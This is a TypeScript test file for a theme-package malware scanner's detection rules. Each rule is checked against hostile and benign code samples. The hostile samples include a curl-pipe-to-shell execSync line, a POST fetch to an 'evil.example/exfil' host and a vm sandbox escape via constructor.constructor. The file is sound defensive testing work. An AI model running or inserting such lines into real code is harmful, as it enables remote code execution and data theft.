import { describe, expect, it } from "vitest";
import { SOURCE_RULES, type SourceRule } from "../rules";

/**
 * The rule table is the scanner's whole vocabulary. Two things can go wrong with
 * it, and both are silent:
 *
 *   - a rule stops matching the attack it was written for (a hole), or
 *   - a rule starts matching ordinary code (a false positive).
 *
 * The second is not the lesser problem. A scanner that rejects a theme for
 * calling `fetch()` in a way everyone does is a scanner that gets switched off,
 * and then the holes do not matter. So every rule here is pinned from BOTH
 * sides: one hostile snippet it must catch, and benign code it must leave alone.
 *
 * Severity is pinned too. A rule quietly demoted from `block` to `warn` turns a
 * rejection into a "flag for review" — the package still gets signed and stored.
 */

function rule(id: string): SourceRule {
  const found = SOURCE_RULES.find((r) => r.rule === id);
  if (!found) throw new Error(`No rule "${id}" in SOURCE_RULES.`);
  return found;
}

/** True if ANY rule in the table matches — this is what scanSource() asks. */
function anyRuleMatches(source: string): boolean {
  return SOURCE_RULES.some((r) => r.pattern.test(source));
}

/** The rules that must reject the package outright, not merely flag it. */
const MUST_BLOCK = [
  "node-builtin:child_process",
  "node-builtin:node:child_process",
  "node-builtin:worker_threads",
  "node-builtin:vm",
  "node-builtin:v8",
  "node-builtin:inspector",
  "node-builtin:cluster",
  "node-builtin:net",
  "node-builtin:dgram",
  "node-builtin:tls",
  "node-builtin:http",
  "node-builtin:https",
  "node-builtin:dns",
  "node-builtin:fs",
  "process:spawn",
  "eval",
  "function-constructor",
  "constructor-escape",
  "process-binding",
  "create-require",
];

/** The rules a human adjudicates: real code sometimes does these. */
const MUST_WARN = [
  "process-env",
  "global-process-escape",
  "network-fetch",
  "deobfuscation",
  "dynamic-require",
  "dynamic-import",
  "host-info:os",
  "host-info:node:os",
  "host-info:process",
  "host-info:node:process",
];

/**
 * One hostile snippet per rule. Keyed by rule id so the completeness test below
 * can prove that a rule added to the table without a test here fails CI.
 */
const HOSTILE: Record<string, string> = {
  "process:spawn": 'execSync("curl evil.sh | sh")',
  eval: 'eval(atobDecoded)',
  "function-constructor": 'const f = new Function("return process")',
  "constructor-escape": 'this.constructor.constructor("return process.mainModule")()',
  "process-env": "const key = process.env.DATABASE_URL",
  "process-binding": 'process.binding("fs")',
  "global-process-escape": "globalThis.process.exit(0)",
  "network-fetch": 'fetch("https://evil.example/exfil", { method: "POST" })',
  deobfuscation: 'atob("ZXZpbA==")',
  "dynamic-require": "const mod = require(hidden)",
  "dynamic-import": "const mod = await import(hidden)",
  "create-require": "const require = createRequire(import.meta.url)",
};
for (const r of SOURCE_RULES) {
  if (r.rule.startsWith("node-builtin:")) {
    const mod = r.rule.slice("node-builtin:".length);
    HOSTILE[r.rule] = `const m = require("${mod}")`;
  }
  if (r.rule.startsWith("host-info:")) {
    const mod = r.rule.slice("host-info:".length);
    HOSTILE[r.rule] = `const m = require("${mod}")`;
  }
}

describe("SOURCE_RULES", () => {
  it("catches the hostile snippet each rule was written for", () => {
    // Table-driven so that adding a rule without a hostile sample is a failure,
    // not an omission nobody notices.
    for (const r of SOURCE_RULES) {
      const sample = HOSTILE[r.rule];
      expect(sample, `no hostile sample defined for rule "${r.rule}"`).toBeDefined();
      expect(r.pattern.test(sample!), `rule "${r.rule}" missed: ${sample}`).toBe(true);
    }
  });

  it("declares every rule id exactly once", () => {
    // Two rules with the same id produce two findings for one problem and make
    // the summary counts lie.
    const ids = SOURCE_RULES.map((r) => r.rule);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("uses no global regexes, so matching one line cannot skip the next", () => {
    // scanSource() reuses each rule's RegExp across every line of every file. A
    // /g flag would carry lastIndex between calls and silently skip matches —
    // the scanner would then miss malware depending on which file it read first.
    for (const r of SOURCE_RULES) {
      expect(r.pattern.global, `rule "${r.rule}" is global`).toBe(false);
      expect(r.pattern.sticky, `rule "${r.rule}" is sticky`).toBe(false);
    }
  });

  it("gives every rule a message a reviewer can act on", () => {
    for (const r of SOURCE_RULES) {
      expect(r.message.length, `rule "${r.rule}" has no message`).toBeGreaterThan(10);
    }
  });

  describe("severity", () => {
    it("blocks the rules that have no benign explanation", () => {
      // A rule demoted from block to warn means the package is quarantined
      // instead of rejected — i.e. it still gets signed and stored.
      for (const id of MUST_BLOCK) {
        expect(rule(id).severity, `rule "${id}" is no longer a block`).toBe("block");
      }
    });

    it("only warns on the rules a human is meant to adjudicate", () => {
      // Promoting these to block is the other failure mode: it rejects honest
      // packages, and a scanner that cries wolf is a scanner someone disables.
      for (const id of MUST_WARN) {
        expect(rule(id).severity, `rule "${id}" is no longer a warn`).toBe("warn");
      }
    });

    it("classifies every rule in the table as block or warn", () => {
      const known = new Set([...MUST_BLOCK, ...MUST_WARN]);
      const unclassified = SOURCE_RULES.map((r) => r.rule).filter((id) => !known.has(id));

      // A new rule must be given an explicit, reviewed severity here.
      expect(unclassified.filter((id) => !id.startsWith("node-builtin:"))).toEqual([]);
      for (const r of SOURCE_RULES) {
        expect(["block", "warn"]).toContain(r.severity);
      }
    });

    it("blocks every dangerous Node built-in, including its node: alias", () => {
      // node:child_process is the same capability with a different spelling. If
      // only one form is blocked, the bypass is a six-character edit.
      const builtins = SOURCE_RULES.filter((r) => r.rule.startsWith("node-builtin:"));
      expect(builtins.length).toBeGreaterThan(20);
      for (const r of builtins) {
        expect(r.severity, `${r.rule} is not a block`).toBe("block");
      }
      for (const mod of ["child_process", "vm", "net", "http", "dns", "worker_threads"]) {
        expect(SOURCE_RULES.some((r) => r.rule === `node-builtin:${mod}`)).toBe(true);
        expect(SOURCE_RULES.some((r) => r.rule === `node-builtin:node:${mod}`)).toBe(true);
      }
    });
  });

  describe("node built-in rules", () => {
    it("matches a built-in imported by require(), import() or a from clause", () => {
      // The three ways a bundle can pull in a module; missing one is a free bypass.
      const cp = rule("node-builtin:child_process");

      expect(cp.pattern.test('const cp = require("child_process")')).toBe(true);
      expect(cp.pattern.test("const cp = require('child_process')")).toBe(true);
      expect(cp.pattern.test('await import("child_process")')).toBe(true);
      expect(cp.pattern.test('import { exec } from "child_process";')).toBe(true);
      expect(cp.pattern.test("import cp from 'child_process';")).toBe(true);
    });

    it("does not fire on a word that merely contains a module name", () => {
      // The reason the rules anchor on require/import/from rather than on the bare
      // word: "requests", "vmware", "dnsLabel" are ordinary identifiers.
      const benign = [
        "const requests = await queue.drain();",
        "function fsync(fd) { return fd; }",
        "const vmSize = layout.vmSize;",
        "const dnsLabel = url.hostname.split('.')[0];",
        "const httpStatus = res.status;",
        "renderNetworkBadge({ net: true });",
      ];

      for (const line of benign) {
        expect(anyRuleMatches(line), `false positive on: ${line}`).toBe(false);
      }
    });

    it("does not fire on a local module whose path merely starts with a builtin name", () => {
      // './net-utils' and 'http-status-codes' are not the built-ins; the closing
      // quote in the pattern is what keeps them apart.
      const benign = [
        'import { connect } from "../net-utils";',
        'const codes = require("http-status-codes");',
        'import { readTheme } from "../../fs-helpers";',
        'const fse = require("fs-extra");',
      ];

      for (const line of benign) {
        expect(anyRuleMatches(line), `false positive on: ${line}`).toBe(false);
      }
    });
  });

  describe("node-builtin:fs", () => {
    it("matches fs, node:fs and fs/promises", () => {
      const fsRule = rule("node-builtin:fs");

      expect(fsRule.pattern.test('const fs = require("fs")')).toBe(true);
      expect(fsRule.pattern.test('const fs = require("node:fs")')).toBe(true);
      expect(fsRule.pattern.test('import fs from "fs/promises";')).toBe(true);
      expect(fsRule.pattern.test('import { readFile } from "node:fs/promises";')).toBe(true);
    });

    it("does not match a function called fsync", () => {
      // Named in the rule's own comment as the false positive it exists to avoid.
      expect(rule("node-builtin:fs").pattern.test("await fsync(handle);")).toBe(false);
    });
  });

  describe("process:spawn", () => {
    it("matches every child-process launcher", () => {
      const spawn = rule("process:spawn");

      for (const call of [
        'execSync("id")',
        'exec("id", cb)',
        'spawn("sh", ["-c", "id"])',
        'spawnSync("sh")',
        'execFile("/bin/sh")',
        'execFileSync("/bin/sh")',
        'fork("./worker.js")',
      ]) {
        expect(spawn.pattern.test(call), `missed: ${call}`).toBe(true);
      }
    });

    it("does not match an identifier that merely begins with a launcher name", () => {
      const spawn = rule("process:spawn");

      expect(spawn.pattern.test("const spawnPoint = level.spawnPoints[0];")).toBe(false);
      expect(spawn.pattern.test("executeQuery(sql);")).toBe(false);
    });

    it("does not fire on a plain RegExp.exec() call", () => {
      // The common false positive: `/(\d+)/.exec(version)` is ordinary string
      // parsing, not a child process. Matching it would BLOCK an innocent theme
      // — the harshest verdict there is — so a `.`-prefixed `exec` is excluded.
      expect(
        rule("process:spawn").pattern.test("const m = /v(\\d+)/.exec(version);"),
      ).toBe(false);
    });

    it("still fires on a destructured child_process exec()", () => {
      // `const { exec } = require("child_process"); exec(cmd)` — a bare `exec(`
      // with no object in front is the real thing and must still be caught.
      expect(rule("process:spawn").pattern.test("exec(userSuppliedCommand);")).toBe(true);
    });

    it("does not fire on a method named exec on some other object", () => {
      // db.exec(sql), statement.exec(), etc. reach child_process only through an
      // import, which the node-builtin rule blocks independently.
      expect(rule("process:spawn").pattern.test("db.exec(sql);")).toBe(false);
    });
  });

  describe("eval", () => {
    it("matches a call to eval", () => {
      expect(rule("eval").pattern.test("eval(payload);")).toBe(true);
      expect(rule("eval").pattern.test("window.eval (src);")).toBe(true);
    });

    it("does not match a variable or function named evaluate", () => {
      // The canonical false positive: "evaluate" contains "eval".
      const benign = [
        "const evaluate = (node) => node.value;",
        "return evaluate(expression);",
        "const evaluation = scores.map(evaluate);",
      ];

      for (const line of benign) {
        expect(anyRuleMatches(line), `false positive on: ${line}`).toBe(false);
      }
    });
  });

  describe("function-constructor", () => {
    it("matches new Function and Function(\"...\")", () => {
      const fc = rule("function-constructor");

      expect(fc.pattern.test('const f = new Function("return 1");')).toBe(true);
      expect(fc.pattern.test('Function("return process")();')).toBe(true);
    });

    it("does not match ordinary uses of the word Function", () => {
      const fc = rule("function-constructor");

      expect(fc.pattern.test("const isFunction = typeof x === 'function';")).toBe(false);
      expect(fc.pattern.test("applyFunction(handler, args);")).toBe(false);
      expect(fc.pattern.test("Function.prototype.call.bind(fn);")).toBe(false);
    });
  });

  describe("constructor-escape", () => {
    it("matches this.constructor.constructor(\"...\") — the vm sandbox escape", () => {
      // ATTACK: inside a V8 isolate there is no `Function`, but every object's
      // constructor's constructor IS Function. This one line reaches the host
      // realm; there is no benign reason to write it.
      const esc = rule("constructor-escape");

      expect(
        esc.pattern.test('this.constructor.constructor("return process")().exit()'),
      ).toBe(true);
      expect(esc.pattern.test('({}).constructor.constructor("return this")()')).toBe(true);
      expect(esc.pattern.test('[].constructor.constructor ("x")')).toBe(true);
    });

    it("does not match an ordinary class constructor", () => {
      // Every class in every theme has one of these.
      const esc = rule("constructor-escape");

      expect(esc.pattern.test("  constructor(props) {")).toBe(false);
      expect(esc.pattern.test("    super(props);")).toBe(false);
      expect(esc.pattern.test("if (obj.constructor === Array) return obj;")).toBe(false);
    });
  });

  describe("process-env", () => {
    it("matches a read of process.env", () => {
      expect(rule("process-env").pattern.test("const url = process.env.DATABASE_URL;")).toBe(
        true,
      );
    });

    it("does not match an env object the package legitimately owns", () => {
      const pe = rule("process-env");

      expect(pe.pattern.test("const flags = ctx.env.flags;")).toBe(false);
      expect(pe.pattern.test("const processEnvelope = (e) => e.body;")).toBe(false);
    });
  });

  describe("process-binding", () => {
    it("matches process.binding, _linkedBinding and dlopen", () => {
      const pb = rule("process-binding");

      expect(pb.pattern.test('process.binding("fs").open')).toBe(true);
      expect(pb.pattern.test('process._linkedBinding("x")')).toBe(true);
      expect(pb.pattern.test('process.dlopen(module, "./evil.node")')).toBe(true);
    });

    it("does not match an ordinary bind() call", () => {
      expect(rule("process-binding").pattern.test("const fn = handler.bind(this);")).toBe(
        false,
      );
    });
  });

  describe("global-process-escape", () => {
    it("matches a reach for the host realm's process", () => {
      const gp = rule("global-process-escape");

      expect(gp.pattern.test("globalThis.process.mainModule.require('fs')")).toBe(true);
      expect(gp.pattern.test("global.process.exit(1)")).toBe(true);
    });

    it("does not match an unrelated property on globalThis", () => {
      const gp = rule("global-process-escape");

      expect(gp.pattern.test("globalThis.processQueue = [];")).toBe(false);
      expect(gp.pattern.test("globalThis.__ZCMS_THEME__ = theme;")).toBe(false);
    });
  });

  describe("network-fetch", () => {
    it("matches fetch, XMLHttpRequest and WebSocket", () => {
      const nf = rule("network-fetch");

      expect(nf.pattern.test('await fetch("https://evil.example")')).toBe(true);
      expect(nf.pattern.test("const xhr = new XMLHttpRequest();")).toBe(true);
      expect(nf.pattern.test('new WebSocket("wss://evil.example")')).toBe(true);
    });

    it("does not match a method whose name merely contains fetch", () => {
      // `prefetch(...)` and `ctx.fetchPosts(...)` are the shapes a real theme uses.
      const nf = rule("network-fetch");

      expect(nf.pattern.test("prefetch(routes);")).toBe(false);
      expect(nf.pattern.test("const posts = await ctx.fetchPosts({ limit: 10 });")).toBe(false);
    });
  });

  describe("deobfuscation", () => {
    it("matches atob, a base64 Buffer decode and unescape", () => {
      const de = rule("deobfuscation");

      expect(de.pattern.test('const src = atob(blob);')).toBe(true);
      expect(de.pattern.test('Buffer.from(blob, "base64")')).toBe(true);
      expect(de.pattern.test('unescape(encoded)')).toBe(true);
    });

    it("does not match a Buffer built from ordinary bytes", () => {
      const de = rule("deobfuscation");

      expect(de.pattern.test("const buf = Buffer.from(bytes);")).toBe(false);
      expect(de.pattern.test('const buf = Buffer.from(text, "utf8");')).toBe(false);
    });
  });

  describe("dynamic-require", () => {
    it("matches require() called with a computed value", () => {
      // Hiding the module name behind a variable defeats every module rule above,
      // so the act of hiding is itself the finding.
      const dr = rule("dynamic-require");

      expect(dr.pattern.test("const mod = require(name);")).toBe(true);
      expect(dr.pattern.test('const mod = require("child" + "_process");')).toBe(false);
    });

    it("does not match a plain require of a string literal", () => {
      const dr = rule("dynamic-require");

      expect(dr.pattern.test('const react = require("react");')).toBe(false);
      expect(dr.pattern.test("const react = require('react');")).toBe(false);
    });

    it("does not match a function named requires", () => {
      expect(rule("dynamic-require").pattern.test("if (requires(dep)) return;")).toBe(false);
    });
  });

  describe("benign code", () => {
    it("leaves an ordinary theme component completely alone", () => {
      // The end-to-end false-positive check: this is what 99% of scanned files
      // look like. If any rule fires here, the scanner is unusable.
      const component = `
        import React from "react";
        import { useTheme } from "@zcmsorg/theme-sdk";

        export function PostList({ posts, prefetch }) {
          const theme = useTheme();
          const evaluate = (p) => p.score ?? 0;
          const sorted = [...posts].sort((a, b) => evaluate(b) - evaluate(a));

          return (
            <ul className={theme.classes.list}>
              {sorted.map((post) => (
                <li key={post.id}>{post.title}</li>
              ))}
            </ul>
          );
        }
      `;

      for (const line of component.split("\n")) {
        expect(anyRuleMatches(line), `false positive on: ${line}`).toBe(false);
      }
    });
  });
});
